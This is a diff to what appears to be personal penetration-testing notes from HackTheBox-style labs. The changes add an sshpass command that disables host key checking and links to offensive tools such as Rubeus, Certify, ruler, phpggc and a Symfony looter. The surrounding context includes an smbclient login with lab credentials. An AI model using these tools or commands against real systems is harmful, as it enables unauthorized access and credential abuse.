@@ -2797,6 +2844,18 @@ Upgrade all packages
 apt-get update && apt-get upgrade -y && pip --disable-pip-version-check list --outdated --format=json | python -c "import json, sys; print('\n'.join([x['name'] for x in json.load(sys.stdin)]))" | xargs -n1 pip install -U && pip install virtualenv==20.21.1
 ```
 
+Frequent command
+
+```bash
+history | awk '{$1=""; print substr($0, 2)}' | sort | uniq -c | sort -nr | less
+```
+
+sshpass
+
+```bash
+sshpass -p yourpass ssh -o StrictHostKeyChecking=off user@host
+```
+
 ### Kali Linux
 
 /usr/share/kali-themes/xfce4-panel-genmon-vpnip.sh
@@ -2813,6 +2872,7 @@ smbclient -U "jab.htb\jmontgomery%Midnight_121" -L "//10.129.230.215/"
 
 - [enum4linux | Portcullis Labs](https://labs.portcullis.co.uk/tools/enum4linux/)
 - [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/)
+- [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) - Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel
 
 ### Unquoted Service
 
@@ -2891,6 +2951,16 @@ smb: \> prompt
 smb: \> recurse
 smb: \> mget *
 ```
+
+### Tools
+
+- [PsTools](https://learn.microsoft.com/en-us/sysinternals/downloads/pstools)
+- [Didier Stevens Suite \| Didier Stevens](https://blog.didierstevens.com/didier-stevens-suite/)
+  - [DidierStevens/DidierStevensSuite](https://github.com/DidierStevens/DidierStevensSuite)
+  - including oledump.py
+- [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file)
+  - including Certify.exe, Rubeus.exe, Seatbelt.txt, etc.
+- [ruler](https://github.com/sensepost/ruler) - A tool to abuse Exchange services
 
 ## Virtualization
 
@@ -3070,6 +3140,10 @@ Argument parser example
 
 - [less.php/bin/lessc](https://github.com/wikimedia/less.php/blob/master/bin/lessc)
 
+Deserialization
+
+- [phpggc](https://github.com/ambionics/phpggc) - PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically
+
 Phar Deserialization
 
 - [PHP: Backward Incompatible Changes - Manual](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar)
@@ -3126,6 +3200,7 @@ services:
 - [CVE-2023-47130](https://www.cve.org/CVERecord?id=CVE-2023-47130) - Yii `unserialize()` RCE
 - [CVE-2023-47444](https://www.cve.org/CVERecord?id=CVE-2023-47444) - OpenCart 4.0.0.0 to 4.0.2.3 RCE
   - [Static Code Injections in OpenCart (CVE-2023-47444)](https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/)
+- [eos](https://github.com/Synacktiv/eos) - Enemies Of Symfony - Debug mode Symfony looter
 
 #### Type Juggling
 
